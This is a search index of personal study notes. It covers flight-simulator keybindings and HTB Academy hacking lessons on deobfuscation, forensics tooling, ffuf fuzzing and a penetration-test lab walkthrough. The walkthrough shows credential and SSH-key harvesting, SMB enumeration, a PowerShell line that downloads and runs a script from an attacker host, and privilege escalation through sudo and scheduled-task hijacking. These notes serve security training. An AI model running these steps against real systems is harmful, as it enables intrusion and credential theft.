{"searchDocs":[{"title":"General","type":0,"sectionRef":"#","url":"/docs/flight-sim/dcs","content":"General This article contains general knowledge and operations about DCS flight sim. Operation\tKeyboardSpeed up time\tCTRL Left + Z Reset time\tShift Left + Z Radio\tÇ Cabin light\tL","keywords":"","version":"Next"},{"title":"Javascript deobfuscation","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/Javascript deobfuscation","content":"","keywords":"","version":"Next"},{"title":"Minification​","type":1,"pageTitle":"Javascript deobfuscation","url":"/docs/Hacking/HTB Academy/Javascript deobfuscation#minification","content":" A common way of reducing the readability of a snippet of JavaScript code while keeping it fully functional is JavaScript minification. Code minification means having the entire code in a single (often very long) line.  ","version":"Next","tagName":"h2"},{"title":"Packer​","type":1,"pageTitle":"Javascript deobfuscation","url":"/docs/Hacking/HTB Academy/Javascript deobfuscation#packer","content":" A packer obfuscation tool usually attempts to convert all words and symbols of the code into a list or a dictionary and then refer to them using the (p,a,c,k,e,d) function to re-build the original code during execution.&quot;  ","version":"Next","tagName":"h2"},{"title":"Advanced Obfuscation​","type":1,"pageTitle":"Javascript deobfuscation","url":"/docs/Hacking/HTB Academy/Javascript deobfuscation#advanced-obfuscation","content":" The strings con be converted to Base64 to make it less human-readable. Here we can see many obfuscation techniques: https://obfuscator.io/  ","version":"Next","tagName":"h2"},{"title":"Deobfuscation​","type":1,"pageTitle":"Javascript deobfuscation","url":"/docs/Hacking/HTB Academy/Javascript deobfuscation#deobfuscation","content":" The invert of minification is called beautify. There are many tools to do this, such as https://beautifier.io/  If the code is not be readable, it might have another obfuscation method applied, we can use https://matthewfl.com/unPacker.html to continue with the deobfuscation.  It is good always to check for some encoding such as Base64. Base64 encoded strings are easily spotted since they only contain alpha-numeric characters. However, the most distinctive feature of base64 is its padding using = characters  Another kind of encoding might be Hex. In this encoding each character is replaced by its value in the ASCII table:  echo https://www.hackthebox.eu/ | xxd -p 68747470733a2f2f7777772e6861636b746865626f782e65752f0a echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r https://www.hackthebox.eu/   A classical encoding is Caesar/Rot13. In this encoding, every character is shifted by 1. a becomes b and so on.  echo https://www.hackthebox.eu/ | tr 'A-Za-z' 'N-ZA-Mn-za-m' uggcf://jjj.unpxgurobk.rh/ echo uggcf://jjj.unpxgurobk.rh/ | tr 'A-Za-z' 'N-ZA-Mn-za-m' https://www.hackthebox.eu/   If you have an encoded message you don't recognize, you can use https://www.boxentriq.com/code-breaking/cipher-identifier. To try to detect the encoding. ","version":"Next","tagName":"h2"},{"title":"Reference","type":0,"sectionRef":"#","url":"/docs/flight-sim/dcs/su25t","content":"","keywords":"","version":"Next"},{"title":"Starting up and take-off​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#starting-up-and-take-off","content":" Operation\tKeyboardCabin light\tL Close cabin\tCtrl Left + C Start/Stop electric power\tShift Right + L Navigation lights\tCtrl Right + L Right engine start\tCtrl Right + Start Left engine start\tAlt Right + Start Take-off/Landing flaps\tShift Left + F Normal flaps\tF Aerodynamic break\tB Landing gear\tG Wheel breaks\tW Radio\tÇ  ","version":"Next","tagName":"h2"},{"title":"Landing​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#landing","content":" Keep vertical speed between 1 and 5 meters  Keep airspeed &lt; 300 kmh  Operation\tKeyboardTake-off/Landing flaps\tShift Left + F Landing gear\tG Wheel breaks\tW Breaking parachute (1 usage only)\tP Right engine stop\tCtrl Right + End Left engine stop\tAlt Right + End  ","version":"Next","tagName":"h2"},{"title":"Navigation​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#navigation","content":" MPW/ENR: Waypoint modeB3B/RTN: Return to base modeMOC/LDNG: Landing mode  Operation\tKeyboard\tNotesNavigation HUD\t1 Next waypoint\tCtrl Left + º AP keep altitude\tAlt Left + 1 or H AP keep altitude and roll\tAlt Left + 2 AP keep level flight\tAlt Left + 3 AP keep radar altitude\tAlt Left + 4\tUseful for very low fligh AP keep barometric altitude\tAlt Left + 5 AP follow route\tAlt Left + 6 or A AP disable any\tAlt Left + 9\t  ","version":"Next","tagName":"h2"},{"title":"Air to ground mode​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#air-to-ground-mode","content":" Operation\tKeyboard\tNotesAir to ground mode\t7\t3MN symbol appears in HUD Change weapon\tD Enable shkival\tO Enable Laser\tShift Right + O\tYou need to remember if the weapon needs laser * Enable Anti-Radar (Fantasmagoria)\tI Discharge amount\tCtrl + backspace Drop interval\tV Gunpod\tC\t  * Check the last letter of the weapon symbol, T means TV, L means laser  ","version":"Next","tagName":"h2"},{"title":"Bombs​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#bombs","content":" There are two modes of dropping an un-guided bomb: https://www.openflightschool.de/mod/book/view.php?id=792  The symbol b appears in the HUD when a bomb is selected.  CCIP​  Continuously Computed Impact Point.  Deep dive into the objective  A vertical line will appear, when the piper is in the objective trigger the joystick  CCRP​  Continuously Computed Release Point.  Flight level and point the piper where you want to drop the bomb.  Press the joystick trigger and keep flying leveled towards the point.  There's a distance indicator in the left side of the HUD, when the indicator reaches the lowest point, the bomb will be released automatically.  ","version":"Next","tagName":"h3"},{"title":"Missiles​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#missiles","content":" Point the skhrval sensor to the target.  Make the reticule smaller as possible and adapt the size of the reticule to the kind of target:  MANPAD: 5mTank: 10mBuilding: 30-60m  When shkrval acquires the lock, you will see NP (Launch authorized).  With the vickr missiles you don't actually need the lock, they will follow the laser. If you spot something before the locking, you can shoot as soon as you are in the required distance.  ","version":"Next","tagName":"h3"},{"title":"Air to air mode​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#air-to-air-mode","content":" Operation\tKeyboard\tNotesAir to air mode\t6\tOTN symbol appears in HUD Gunpod\tC\tPlace the target aircraft in the middle of the symbol wings ","version":"Next","tagName":"h2"},{"title":"Introduction to Purple team","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/Introduction to Purple team","content":"","keywords":"","version":"Next"},{"title":"Windows tooling​","type":1,"pageTitle":"Introduction to Purple team","url":"/docs/Hacking/HTB Academy/Introduction to Purple team#windows-tooling","content":" System monitoring, event logging  Name\tDescriptionSysmon\tProvides detailed event logging and detection  Log analysis  Name\tDescriptionEric Zimmerman Tools\tForensic utilities for analyzing digital evidence, such as registry hives and event logs.  Threat detection &amp; Monitoring  Name\tDescriptionYara\tSignature-based file scanning tool. Chainsaw\tCommand-line tool for parsing and hunting through Windows Event Logs. Sigma\tGeneric signature format for SIEM rule creation. Zircolite\tSigma-based EVTX log analysis. Osquery\tEndpoint monitoring using SQL-like queries. Velociraptor\tEndpoint monitoring, collection, and response. Velociraptor\tEndpoint monitoring, collection, and response.  Traffic Capturing  Name\tDescriptionWireshark\tPacket capture tool for network analysis.  Memory dumping  Name\tDescriptionDumpIt\tMemory dumping utility for memory forensics. WinPmem\tMemory dumping utility for memory forensics.  Memory Forensics  Name\tDescriptionVolatility v2\tMemory forensics tool for analyzing memory dumps. Volatility v3\tMemory forensics tool for analyzing memory dumps.  Additional Telemetry  Name\tDescriptionSilkETW\tC# wrappers for ETW. SealighterTI\tRunning Microsoft-Windows-Threat-Intelligence without a driver. AMSI-Monitoring-Script\tExtracting script contents using the AMSI ETW provider. JonMon\tCollection of open-source telemetry sensors. Fibratus\tAdversary tradecraft detection using behavior-driven rule engine and YARA memory scanner.  Adversary Simulation  Name\tDescriptionAtomic Red Team\tSmall and highly portable detection tests based on MITRE's ATT&amp;CK.  Malware/Process/PE Analysis  Name\tDescriptionCFF-Explorer\tExamine and edit Portable Executable (PE) Ghidra\tReverse engineering framework x64dbg\tx64/x32 debugger for windows SpeakEasy\tBinary emulator to emulate Windows kernel and user mode malware SysInternalsSuite\tSysinternals Troubleshooting Utilities Get-InjectedThread\tLooks for threads that were created as a result of code injection. Hollows Hunder\tScan all running processes. Recognizes and dumps a variety of implants. Moneta\tLive usermode memory analysis tool for Windows PE-Sleve\tDetects malware running on the system, as well as collects the potentially malicious material for further analysis. API-Monitor\tMonitors and controls API calls made by applications and services. PE-Bear\tMultiplatform reversing tool for PE files. ProcessHacker\tMonitors system resources, debugs software and detects malware. ProcMonX\tExtended Process Monitor-like tool based on Event Tracing for Windows. Frida\tDynamic instrumentation toolkit for reverse-engineers. Helps to trace, instrument, debug and hook API functions LitterBox\tMalware sandbox environment for payload behavior testing.  ","version":"Next","tagName":"h2"},{"title":"Windows logging​","type":1,"pageTitle":"Introduction to Purple team","url":"/docs/Hacking/HTB Academy/Introduction to Purple team#windows-logging","content":" Sysmon  Sysmon (System Monitor) is a powerful system activity monitoring tool within the Microsoft Sysinternals suite. Sysmon logs can be viewed in the Event Viewer by navigating to Applications and Services Logs &gt; Microsoft &gt; Windows &gt; Sysmon.  Sysmon logs are stored as part of the Windows Event Log system. The logs are located on disk at the following default path:  C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%4Operational.evtx  Event ID 1 in sysmon logs are events for process creation.  Command Line Logging  Command Line Logging captures information about processes and their command-line arguments, which is useful for detecting suspicious activity, such as unauthorized execution of commands. The relevant Windows event ID is 4688 (A new process has been created). These can be seen in Windows Event Log, Sysmon and JonMon.  Stored in disk in C:\\Windows\\System32\\winevt\\Logs\\Security.evtx  PowerShell Logging  Script block logging captures the full content of scripts that are executed, including obfuscated or dynamically generated code. This is crucial for detecting sophisticated attacks. The Event ID for Script Block Logging is 4104. PowerShell logs can be viewed in the Event Viewer by navigating to Applications and Services Logs &gt; Microsoft &gt; Windows &gt; PowerShell.  Stored in disk in C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx  Console History  The console history is stored in the user's profile directory at the following location:  C:\\Users%username%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt  Audit policies  Verbose auditing provides comprehensive tracking of both success and failure events across the system. Audit policy logs provide detailed insights into system access, privilege usage, and security settings modifications.  They are stored by default in C:\\Windows\\System32\\winevt\\Logs\\Security.evtx.  Windows Firewall Logs  Windows Firewall logs provide detailed information about inbound and outbound network connections, including allowed and blocked connections.  Stored in C:\\Windows\\System32\\LogFiles\\Firewall\\pfirewall.log  here is another event (Event ID 5156) that is logged by the Windows Filtering Platform (WFP), which is responsible for processing network packets.  JonMon  By combining data from both the kernel-level and user-mode components, JonMon provides users with a comprehensive view of their security activity. This is installed as a service in the host. JonMon-generated logs can be viewed in the Event Viewer by navigating to Applications and Services Logs &gt; JonMon.  SealighterTI  The Microsoft-Windows-Threat-Intelligence Event Tracing for Windows (ETW) provider is a robust tool for detecting process injection and other types of attacks. SealighterTI facilitates the logging of events from the Microsoft-Windows-Threat-Intelligence provider into the Windows Event Log, enhancing visibility into such activities. Runs in the background via a scheduled task. Applications and Service Logs &gt; Sealighter  ","version":"Next","tagName":"h2"},{"title":"Dumping and analyzing Windows Memory​","type":1,"pageTitle":"Introduction to Purple team","url":"/docs/Hacking/HTB Academy/Introduction to Purple team#dumping-and-analyzing-windows-memory","content":" Memory dumping is a vital capability in forensic investigations, enabling the capture of the current state of a system's volatile memory for detailed post-incident analysis. This snapshot provides a wealth of information, such as active processes, loaded drivers, network connections, and potential malicious artifacts that may not be visible on disk.  We can use DumpIt or WinPmem to create a full memory dump.  To analyze the memory, we'll use Volatility v2/3.  ","version":"Next","tagName":"h2"},{"title":"Linux toolings​","type":1,"pageTitle":"Introduction to Purple team","url":"/docs/Hacking/HTB Academy/Introduction to Purple team#linux-toolings","content":" System monitoring and auditing  Tool\tPath\tDescriptionSysmon (Linux)\t/usr/bin/sysmon\tProvides detailed event logging and detection. Auditd\t/usr/sbin/auditd\tAuditing tool to track system-level events.  Threat detection and monitoring  Tool\tPath\tDescriptionYARA\t/usr/local/bin/yara\tSignature-based file scanning tool. Sigma\t/usr/local/bin/sigma\tGeneric signature format for SIEM rule creation. Suricata\t/usr/bin/suricata\tOpen-source IDS/IPS with network monitoring capabilities. osquery\t/usr/bin/osqueryi\tEndpoint monitoring using SQL-like queries. Zircolite\t/root/zircolite/zircolite.py\tSigma-based EVTX log analysis. Velociraptor\t/usr/local/bin/velociraptor\tEndpoint monitoring, collection, and response. bpftrace\t/usr/bin/bpftrace\tHigh-level tracing language for Linux  Traffic capturing: tcpdump / wireshark  Memory extractor: LiME: /root/LiME/src/lime-5.15.0-71-generic.ko  Memory dump analysis: Volatility v2: /root/volatility-master/vol.py  Adversary simulation: Atomic Read team: /root/AtomicRedTeam. Small and highly portable detection tests based on MITRE's ATT&amp;CK.  ","version":"Next","tagName":"h2"},{"title":"Linux logging​","type":1,"pageTitle":"Introduction to Purple team","url":"/docs/Hacking/HTB Academy/Introduction to Purple team#linux-logging","content":" Sysmon exists in Linux as well and you can see the output in syslog:  cat /var/log/syslog | /opt/sysmon/sysmonLogView   audit is a Linux daemon that collects, processes, and records audit log events to disk.  The logs are stored in /var/log/audit/audit.log. You can use aureport or ausearch to analyze them efficiently:  ausearch -k rootcmd -i   ","version":"Next","tagName":"h2"},{"title":"Dumping memory in Linux​","type":1,"pageTitle":"Introduction to Purple team","url":"/docs/Hacking/HTB Academy/Introduction to Purple team#dumping-memory-in-linux","content":" We'll use LiME (Linux Memory Extractor) kernel module to dump memory:  sudo insmod lime-5.15.0-71-generic.ko &quot;path=/tmp/dump.mem format=lime&quot;   To analyze the dump, one can use Volatily v2. In this example, we are interested in knowing which active tasks are in the memory dump:  python2.7 vol.py -f /tmp/dump.mem --profile=LinuxUbuntu_5_15_0-71-generic_profilex64 linux_pslist   --profile=LinuxUbuntu_5_15_0-71-generic_profilex64 specifies the memory formatlinux_pslist is a volatility plugin to retrieve the list of processes in the particular dump. ","version":"Next","tagName":"h2"},{"title":"Fuzzing with ffuf","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/ffuf","content":"","keywords":"","version":"Next"},{"title":"Directory fuzzing​","type":1,"pageTitle":"Fuzzing with ffuf","url":"/docs/Hacking/HTB Academy/ffuf#directory-fuzzing","content":" This type of fuzzing tries to reveal accessible directories in a web server. In order to do so, we need to place the keyword FUZZ in the part of the URL we want to fuzz:  ffuf -w &lt;SNIP&gt; -u http://SERVER_IP:PORT/FUZZ   e.g:  ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ   In general, all usages of fuff will be like this. FUZZ keyword needs to be specified in the wordlist so that the variable is populated from the wordlist and in the part that needs to be &quot;fuzzed&quot;  ","version":"Next","tagName":"h2"},{"title":"Extension fuzzing​","type":1,"pageTitle":"Fuzzing with ffuf","url":"/docs/Hacking/HTB Academy/ffuf#extension-fuzzing","content":" We can try to find the technology of the web server by fuzzing the extensions of the webpages:  ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ   This will try with: .php, .asp, etc..  ","version":"Next","tagName":"h2"},{"title":"Page fuzzing​","type":1,"pageTitle":"Fuzzing with ffuf","url":"/docs/Hacking/HTB Academy/ffuf#page-fuzzing","content":" Once we know the extension, we now can fuzz what pages are available with that extension:  ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php   ","version":"Next","tagName":"h2"},{"title":"Recursive fuzzing​","type":1,"pageTitle":"Fuzzing with ffuf","url":"/docs/Hacking/HTB Academy/ffuf#recursive-fuzzing","content":" We might have multiple directories and in each directory multiple pages. In order to fuzz all of those, we can fuzz recursively.  ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v   Note that we can specify the depth of the recursion. For each directory, it will restart the wordlist and fuzz the whole directory.  ","version":"Next","tagName":"h2"},{"title":"Sub-domain fuzzing​","type":1,"pageTitle":"Fuzzing with ffuf","url":"/docs/Hacking/HTB Academy/ffuf#sub-domain-fuzzing","content":" Sub-domains can be fuzzed in the same as other components of the website, think of examples such as photos.google.com, etc...  Similarly to other fuzzing attacks, we just need a word list and where to inject the fuzzed word. For example:  ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/   ","version":"Next","tagName":"h2"},{"title":"Virtual host fuzzing​","type":1,"pageTitle":"Fuzzing with ffuf","url":"/docs/Hacking/HTB Academy/ffuf#virtual-host-fuzzing","content":" The key difference between VHosts and sub-domains is that a VHost is basically a 'sub-domain' served on the same server and has the same IP, such that a single IP could be serving two or more different websites. VHosts may or may not have public DNS records.  To fuzz virtual hosts, you need to specify the host using the HTTP Header Host. For example:  ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'   ","version":"Next","tagName":"h2"},{"title":"Filtering​","type":1,"pageTitle":"Fuzzing with ffuf","url":"/docs/Hacking/HTB Academy/ffuf#filtering","content":" The results automatically discard 404 Not found and keeps the rest.  FILTER OPTIONS: -fc Filter HTTP status codes from response. Comma separated list of codes and ranges -fl Filter by amount of lines in response. Comma separated list of line counts and ranges -fr Filter regexp -fs Filter HTTP response size. Comma separated list of sizes and ranges -fw Filter by amount of words in response. Comma separated list of word counts and ranges   Sometimes, the response is 200 OK, but just showing an error or a not found. In this case, let's say the size of the page is 900 bytes. So, in this case, we'll set the -fs parameter specify we only want to see results whose size is bigger than 900 Bytes:  ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900   ","version":"Next","tagName":"h2"},{"title":"Parameter Fuzzing - GET​","type":1,"pageTitle":"Fuzzing with ffuf","url":"/docs/Hacking/HTB Academy/ffuf#parameter-fuzzing---get","content":" Fuzzing parameters may expose unpublished parameters that are publicly accessible. Such parameters tend to be less tested and less secured.  GET Parameters are passed in the URL, e.g:  http://admin.academy.htb:PORT/admin/admin.php?param1=value  So, we need to place the FUZZ keyword in the URL:  ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=value   ","version":"Next","tagName":"h2"},{"title":"Parameter Fuzzing - POST​","type":1,"pageTitle":"Fuzzing with ffuf","url":"/docs/Hacking/HTB Academy/ffuf#parameter-fuzzing---post","content":" The main difference between POST requests and GET requests is that POST requests are not passed with the URL and cannot simply be appended after a ? symbol. POST requests are passed in the data field within the HTTP request.  Now, in fuff we can add the FUZZ parameter in the post data:  ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'   ","version":"Next","tagName":"h2"},{"title":"Value fuzzing​","type":1,"pageTitle":"Fuzzing with ffuf","url":"/docs/Hacking/HTB Academy/ffuf#value-fuzzing","content":" Once we discovered GET or POST parameters, we can fuzz if there's a special value or something interesting. Since every application is a different word, we might need to build our own word list.  Let's imagine that in our case, we spotted id parameter and can accept a number input of some sort. These ids can be in a custom format, or can be sequential, like from 1-1000 or 1-1000000, and so on. We'll start with a wordlist containing all numbers from 1-1000:  for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done   Now we can use this wordlist in fuff:  ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'  ","version":"Next","tagName":"h2"},{"title":"Pentest in a nutshell","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/Pentest In a Nutshell","content":"","keywords":"","version":"Next"},{"title":"Linux information gathering​","type":1,"pageTitle":"Pentest in a nutshell","url":"/docs/Hacking/HTB Academy/Pentest In a Nutshell#linux-information-gathering","content":" If we discover FTP port listening:  Try to log as anonymous user. The FTP service will prompt us for a username and password, which, by default, are anonymous:whatever.  ftp&gt; ls 229 Entering Extended Passive Mode (|||47456|) 150 Opening ASCII mode data connection for file list -rw-rw-r-- 1 john john 964 Feb 15 22:14 WordPress_Blog_Setup_Update.txt 226 Transfer complete   Here, we see that there is a file called WordPress_Blog_Setup_Update.txt, which might contains some interesting data for us. We also see that the file is owned by the user john . After we add these findings to our notes, we download the file using the get &lt;filename&gt; command.  Now check the empty files with ls -al:  ftp&gt; ls -al 229 Entering Extended Passive Mode (|||42851|) 150 Opening ASCII mode data connection for file list drwxr-x--- 4 john john 4096 Feb 16 17:28 . drwxr-x--- 4 john john 4096 Feb 16 17:28 .. -rw------- 1 john john 1153 Feb 15 21:13 .bash_history -rw-r--r-- 1 john john 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 john john 3771 Jan 6 2022 .bashrc drwx------ 2 john john 4096 Feb 15 17:16 .cache -rw------- 1 john john 20 Feb 16 16:34 .lesshst -rw-r--r-- 1 john john 807 Jan 6 2022 .profile drwxrwxr-x 2 john john 4096 Feb 12 13:55 .ssh -rw-r--r-- 1 john john 0 Feb 11 10:18 .sudo_as_admin_successful -rw------- 1 john john 17094 Feb 15 22:14 .viminfo -rw-rw-r-- 1 john john 964 Feb 15 22:14 WordPress_Blog_Setup_Update.txt 226 Transfer complete   Each of these files could contain important information for us, but first we will download the .bash_history file (which can reveal the existence of certain programs, files, directories, access, and more.). By default, Bash saves the last 500-1000 commands in this file, though this number can be configured.  Another potential goldmine is the .ssh directory. This directory (most of the time) is used to store files related to SSH, such as private keys, configs, and more:  ftp&gt; cd .ssh 250 CWD command successful ftp&gt; ls -al 229 Entering Extended Passive Mode (|||26184|) 150 Opening ASCII mode data connection for file list -rw------- 1 john john 2602 Feb 12 13:55 id_rsa -rw-r--r-- 1 john john 565 Feb 12 13:55 id_rsa.pub 226 Transfer complete   If a wordpress is discovered, we can enumerate more using wpscan:  wpscan --url https://10.129.233.210 --disable-tls-checks   With the information we have from wpscan, we can use metasplot framework to check if we can get a reverse shell. Also the .bash_history reveales some credentials and we can connect using the id_rsa file using normal SSH.  ","version":"Next","tagName":"h2"},{"title":"Linux System enumeration​","type":1,"pageTitle":"Pentest in a nutshell","url":"/docs/Hacking/HTB Academy/Pentest In a Nutshell#linux-system-enumeration","content":" At this point, we have access to the machine. We are at Post-Exploitation phase:  In the Exploitation stage, we usually do not have any local or privileged access to any of the provided services of the target. However, in the Post-Exploitation stage we do. In other words, Exploitation stage is when we attack the target system from outside and Post-Exploitation when we attack it from within.  In this phase, we need to collect at least the following pieces of information:  System Information: OS version, kernel version, architecture, and installed patchesUser Information: Current user privileges, all users on the system, sudo rightsNetwork Information: Network interfaces, routing tables, active connectionsRunning Services: Active processes, listening ports, scheduled tasksFile System: Interesting files, permissions issues, mounted drivesInstalled Software: Applications, versions, potential vulnerabilitiesSecurity Mechanisms: Firewall rules, SELinux status, AppArmor profiles  This information can be collected automatically using Linux Privilege Escalation Awesome Script (LinPEAS).  Now, we should analyze the output of linpeas for vulnerabilities for privilege escalation or lateral movement.  ","version":"Next","tagName":"h2"},{"title":"Linux Privilege Escalation.​","type":1,"pageTitle":"Pentest in a nutshell","url":"/docs/Hacking/HTB Academy/Pentest In a Nutshell#linux-privilege-escalation","content":" For privilege escalation on a Linux system, we aim to become the root user (aka superuser) on the target system.  Examine the output of sudo -l:  john@ubuntu:~$ sudo -l Matching Defaults entries for john on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\\\:/snap/bin, use_pty User john may run the following commands on ubuntu: (root) NOPASSWD: /usr/bin/nano (ALL : ALL) ALL   John can run /usr/bin/nano as root without typing a password (NOPASSWD), making it extremely convenient to edit system files  He can run any command as any user or group ((ALL : ALL) ALL), effectively granting full administrative privileges, though he must enter his password for all commands except for nano.  Now, we can go to GTFO bins to escape nano and land in a root shell.  ","version":"Next","tagName":"h2"},{"title":"Linux pillaging​","type":1,"pageTitle":"Pentest in a nutshell","url":"/docs/Hacking/HTB Academy/Pentest In a Nutshell#linux-pillaging","content":" The term pillaging refers to the process of extracting valuable information from a compromised system for purposes such as privilege escalation, lateral movement, or data exfiltration. Now that we have the highest possible privileges, we can access sensitive files that were previously off-limits.  Now, we can run linpeas as root, to see if it reveals more information that was not previously available. This means that we can find active credentials that are being used by the system. We can get access to root id_rsa key, .bash_history, etc...  ","version":"Next","tagName":"h2"},{"title":"Windows information gathering​","type":1,"pageTitle":"Pentest in a nutshell","url":"/docs/Hacking/HTB Academy/Pentest In a Nutshell#windows-information-gathering","content":" Very similar to Linux, typically running nmap and enumerate services running in the machine and their versions:  sudo nmap -p- -sV -sC 10.129.12.20 -T5 -Pn   If you discover SMB shares, you can use crackmapexec tool or nxc tool to investigate further.  Make sure to try to connect with NULL account, i.e. empty user and password:  crackmapexec smb 10.129.12.20 -u '' -p '' --users   Also, it's a good idea to check the Guest account as well:  crackmapexec smb 10.129.12.20 -u guest -p '' --shares   If it turns out we have valid credentials, we can try to search for file patterns. This is called spidering: https://www.netexec.wiki/smb-protocol/spidering-shares  crackmapexec smb 10.129.12.20 -u &quot;john&quot; -p 'SuperSecurePass123' --spider Devs --pattern . crackmapexec smb 10.129.12.20 -u &quot;john&quot; -p 'SuperSecurePass123' --share Devs --get-file tmp.ps1 tmp.ps1   It turns out this file reveals a PowerShell script with hardcoded credentials.  ","version":"Next","tagName":"h2"},{"title":"Windows System Enumeration​","type":1,"pageTitle":"Pentest in a nutshell","url":"/docs/Hacking/HTB Academy/Pentest In a Nutshell#windows-system-enumeration","content":" Once we have the initial access to the Windows machine, we can enumerate it from inside.  User information  PS C:\\Users\\john&gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======= SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled   Now, let’s take a look at the groups we are member of.  PS C:\\Users\\john&gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ==================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\\\Event Log Readers Alias S-1-5-32-573 Mandatory group, Enabled by default, Enabled group BUILTIN\\\\Remote Desktop Users Alias S-1-5-32-555 Mandatory group, Enabled by default, Enabled group BUILTIN\\\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\\\High Mandatory Level Label S-1-16-12288   We can use net command as well:  PS C:\\Users\\john&gt; net user john   We can check scheduled tasks:  PS C:\\Users\\john&gt; schtasks /query /fo LIST /v   Similar to linpeas, it exists the winpeas script. We can run it without touching the disk with:  PS C:\\Users\\john&gt; powershell &quot;IEX(New-Object Net.WebClient).downloadString('http://&lt;attacking-machine-IP&gt;:8080/winPEAS.ps1')&quot; &gt; winpeas.txt   This will list write permissions in unsual places, open ports, user information (SID, groups and privileges) and system information.  To check permissions on files, we can use icacls, it manages NTFS file system permissions, specifically the discretionary access control lists (DACLs), allowing administrators to view, modify, grant, deny, or remove permissions on files and directories:  PS C:\\\\ProgramData&gt; icacls &quot;C:\\\\ProgramData\\\\CorpBackup\\\\Scripts\\\\backupprep.ps1&quot; C:\\\\ProgramData\\\\CorpBackup\\\\Scripts\\\\backupprep.ps1 Everyone:(I)(F) NT AUTHORITY\\\\SYSTEM:(I)(F) BUILTIN\\\\Administrators:(I)(F) BUILTIN\\\\Users:(I)(RX) Successfully processed 1 files; Failed processing 0 files   ","version":"Next","tagName":"h2"},{"title":"Windows Privilege Escalation​","type":1,"pageTitle":"Pentest in a nutshell","url":"/docs/Hacking/HTB Academy/Pentest In a Nutshell#windows-privilege-escalation","content":" Looks like we identified one scheduled task and we have write access to the script. We can perform:  Script modification for code injection - Add a user to the administrators group and add a reverse shellCredential harvesting - Dump credentials or use it as a keyloggerPersistence via task hijacking - Append code to maintain access by creating a new scheduled task that runs our payload frequentlyChanging Passwords - Change administrator’s password and create a new RDP session as the user Administrator  Since the script is executed with Administrator permission, we can use it to add the user to administrators group:  Add-LocalGroupMember -Group &quot;Administrators&quot; -Member &quot;WIN01\\\\john&quot;   Now, we wait two minutes and the user will be in the Administrators group.  ","version":"Next","tagName":"h2"},{"title":"Windows Pillaging​","type":1,"pageTitle":"Pentest in a nutshell","url":"/docs/Hacking/HTB Academy/Pentest In a Nutshell#windows-pillaging","content":" Now, we can run winpeas script and will output some information that before was not accessible. Also there's the winpill.ps1 script that will automate retrieval of interesting data.  ","version":"Next","tagName":"h2"},{"title":"Proof-of-Concept​","type":1,"pageTitle":"Pentest in a nutshell","url":"/docs/Hacking/HTB Academy/Pentest In a Nutshell#proof-of-concept","content":" We can summarize the process of a pentest in the following steps:  Information GatheringVulnerability AssessmentExploitationLocal Information GatheringLocal Vulnerability AssessmentPost-Exploitation (Privilege Escalation)Privileged Local Information Gathering (Pillaging)Privileged Local Vulnerability Assessment 